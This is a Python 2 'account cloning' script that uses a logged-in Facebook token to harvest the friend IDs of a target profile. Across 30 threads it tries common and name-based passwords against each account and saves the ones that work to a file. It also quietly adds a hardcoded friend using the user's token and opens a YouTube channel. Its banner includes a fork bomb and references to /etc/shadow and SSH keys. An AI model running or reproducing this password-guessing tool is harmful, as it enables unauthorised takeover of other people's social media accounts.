#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)
#Dev:love_hacker
##### LOGO #####
logo1 = """
\033[1;91m                   ./ymM0dayMmy/.
\033[1;91m                -+dHJ5aGFyZGVyIQ==+-
\033[1;91m             `:sm⏣~~Destroy.No.Data~~s:`
\033[1;91m          -+h2~~Maintain.No.Persistence~~h+-
\033[1;91m       `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`
\033[1;91m    ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.
\033[1;91m   -++SecKCoin++e.AMd`          `.-:/+hbove.913.ElsMNh+-
\033[1;91m  -~/.ssh/id_rsa.Des-                `htN01UserWroteMe!-
\033[1;91m:dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:
\033[1;91m:we're.all.alike'`                     The.PFYroy.No.D7:
\033[1;91m:PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:
\033[1;91m:msf>exploit -j.                       :Ns.BOB&ALICEes7:
\033[1;91m:---srwxrwx:-.`                        `MS146.52.No.Per:
\033[1;91m:<script>.Ac816/                        sENbove3101.404:
\033[1;91m:NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:
\033[1;91m:09.14.2011.raid                       /STFU|wall.No.Pr:
\033[1;91m:hevnsntSurb025N.                      dNVRGOING2GIVUUP:
\033[1;91m:#OUTHOUSE-  -s:                       /corykennedyData:
\033[1;91m:$nmap -oS                              SSo.6178306Ence:
\033[1;91m:Awsm.da:                            /shMTl#beats3o.No.:
\033[1;91m:Ring0:                             `dDestRoyREXKC3ta/.:
\033[1;91m:23d:                               sSETEC.ASTRONOMYist:
\033[1;91m /-                        /yo-    .ence.N:(){ :|: & };:
\033[1;91m                           `:Shall.We.Play.A.Game?tron/
\033[1;91m                           ```-ooy.if1ghtf0r+ehUser5`
\033[1;91m                         ..th3.H1V3.U2VjRFNN.jMh+.`
\033[1;91m                        `MjM~~WE.ARE.se~~MMjMs
\033[1;91m                          +~KANSAS.CITY's~-`
\033[1;91m                           J~HAKCERS~./.`
\033[1;91m                            .esc:wq!:`
\033[1;91m                            +;+ATH`
\033[1;92m   BlackMafia WhatsApp Num
\033[1;95m         03094161457"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo1
		print('	' )
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;93m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;92mLogin Successful.•◈•..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;93mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:love_hacker
	print logo1
	print "  \033[1;92m«--------\033[1;93mLogged in User Info\033[1;92m--------»"
	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
	print "	   \033[1;91m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;93m              "
	print 52 * '\033[1;95m='
        print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()
def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo1
	print "\033[1;92m--\033[1;91m> \033[1;92m1.\x1b[1;95mClone From Public ID👨‍👨‍👦‍👦."
	print "\033[1;92m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
	pilih_super()
def pilih_super():
	peak = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo1
		idt = raw_input("\033[1;96m[◈] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
		print 52 * '\033[1;95m='
                try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;92mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;93mGetting IDs\033[1;92m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()	
	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
	jalan('\033[1;92mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
                print "\n\033[1;92m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;92m---•◈••◈•-»"
	        print "\033[1;92m•====================•\033[1;91mBlackMafia\033[1;92m•================•"
	        jalan(' \033[1;93m.....\033[1;94mCloning Start plzzz Wai\033[1;93m.... ')
	        jalan(' \033[1;93m.....\033[1;93mJis Sy Wi8 Ni hota Wo Bhag jy\033[1;93m.... ')
	        print "\033[1;92m•====================•\033[1;91mBlackMafia\033[1;92m•================•"
				
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:love_hacker
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;94m✙\x1b[1;95m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;94m✙\x1b[1;97m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;95mlive \x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
															                cekpoint.append(user+pass7)													
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 52 * '\033[1;95m='
        print"\033[1;95mTotal live/\x1b[1;92mError\033[1;91m: \033[1;95m"+str(len(oks))+"\033[1;97m/\033[1;92m"+str(len(cekpoint))
	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
